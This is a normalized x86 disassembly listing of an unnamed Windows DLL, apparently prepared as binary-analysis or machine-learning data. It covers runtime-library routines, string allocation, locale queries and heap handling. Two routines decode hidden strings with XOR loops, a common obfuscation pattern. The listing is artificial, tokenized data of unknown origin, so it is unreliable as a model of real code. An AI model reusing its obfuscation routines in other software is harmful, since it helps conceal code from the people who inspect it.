lea ecx [ ebp - 0x19c ]
call sub_10061060
lea ecx [ ebp - 0x164 ]
call sub_10061060
lea ecx [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10061060
mov edi [ ebp - 0x1a4 ]
xor esi esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x1a8 ] esi
call sub_100010b0
mov [ ebp - 0x1b8 ] eax
mov ebx edi
cmp eax esi
jne r-xdata
mov ebx [ ebp - 0x1b4 ]
sub_100096df
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100268d7
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1000977c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100101fa
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_100097c8
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100097fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1007dc65
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1007dcf3
push eax
mov [ ebp - 0xc ] eax
call sub_1000485b
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10009b10
push ebp
mov ebp esp
push 0xffffffff
push sub_10080d61
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_10009be0
push ebp
mov ebp esp
sub esp 0xf8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc0 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xf8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc8 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0xb4 ] edx
mov edx [ ebp + 0x24 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0xcc ] ecx
mov ecx [ ebp + 0x2c ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xf4 ] edx
mov edx [ ebp + 0x30 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp + 0x34 ]
mov [ ebp - 0xb8 ] ecx
mov ecx [ ebp + 0x38 ]
xor edi edi
mov [ ebp - 0xec ] edx
mov edx [ ebp + 0x3c ]
mov [ ebp - 0xe4 ] eax
mov eax [ ebp + 0x40 ]
mov [ ebp - 0xd0 ] ecx
mov ecx [ ebp + 0x44 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ ebp - 0xd8 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe8 ] ecx
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x13
call sub_100050e0
mov eax [ esi ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xfd
call sub_100050e0
mov [ esi + 0x4 ] edi
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x4 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0xd4 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xd4 ]
push edx
push ebx
push eax
mov [ esi ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi ] edi
lea edx [ ebp - 0xa8 ]
mov eax 0xf4
call sub_100050e0
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc0 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax edi
je r-xdata
push r--data
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push r--data
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc0 ]
push ebx
push ecx
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
lea edx [ ebp - 0x2c ]
mov eax 0x12
call sub_100050e0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
mov ebx [ ebp - 0xbc ]
add esp 0xc
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x54
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xbc ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x22
call sub_100050e0
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x16
call sub_100050e0
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc8 ]
push ebx
push ecx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x82
call sub_100050e0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb4 ]
push ebx
push ecx
push eax
mov [ esi + 0x18 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x18 ] edi
mov ebx [ ebp - 0xb4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xa6
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x20 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc4 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0xc4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x17
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x2c ] eax
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xcc ]
cmp eax edi
je r-xdata
mov [ esi + 0x28 ] edi
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0xdc ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xec ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xb8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xe4 ]
cmp eax edi
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x34 ] eax
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb8 ]
push ebx
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x30 ] edi
lea edx [ ebp - 0x34 ]
mov eax 0xcb
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0xd8 ]
cmp eax edi
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0xd0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xb0
call sub_100050e0
push eax
call sub_10055686
cdq
add esp 0x4
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] edx
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xd
call sub_100050e0
push eax
call sub_10055686
add esp 0x4
mov [ esi + 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xe0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x40
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov [ esi + 0x48 ] 0x989680
mov eax esi
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x40
push eax
call sub_10055686
mov [ esi + 0x48 ] eax
add esp 0x4
mov eax esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x40
mov eax [ ebp - 0xe8 ]
cmp eax edi
je r-xdata
sub_1000a0d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_100306ed
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_1000a10e
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1002b6c2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1006b2d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1000a1c5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_100306ed
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_10079b60
pop ecx
inc eax
jmp r-xdata
sub_1000a25b
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] ax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_10007cfe
push [ eax + 0x14 ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_1000a2b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_10019180
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000a2de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10017f6e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1000a300
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x70 ] eax
mov eax [ eax + 0x1c ]
lea esi [ ebp - 0x5c ]
push esi
xor ebx ebx
mov edi edx
mov [ ebp - 0x5c ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x60 ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov [ ebp - 0x6c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x132
call sub_100050e0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
lea esi [ ebp - 0x64 ]
push esi
mov [ ebp - 0x64 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x83
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x70 ]
lea eax [ ebp - 0x68 ]
push eax
push edx
mov [ ebp - 0x68 ] ebx
call sub_10045f30
mov esi [ ebp - 0x68 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x6c ]
inc ecx
mov [ ebp - 0x6c ] ecx
cmp ecx [ ebp - 0x60 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push esi
call sub_1004bbc0
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
push esi
call sub_1005eed0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x6c
jmp r-xdata
push esi
call sub_1005eed0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_100050e0
sub_1000a460
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1000a4a1
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_10022837
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_1000a510
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_1002c5ed
pop ebp
retn 0x4
push ebx
push edi
call sub_1005c940
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_10078db0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_1006591f
add esp 0x4
sub_1000a584
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_10045c61
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_10028390
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_10028613
add esp 0x1c
push eax
call sub_100285e6
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_100051e8
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_1005ad98
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_1000a685
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
pop ebp
retn 0x4
sub_1000a6d0
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xffb8
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
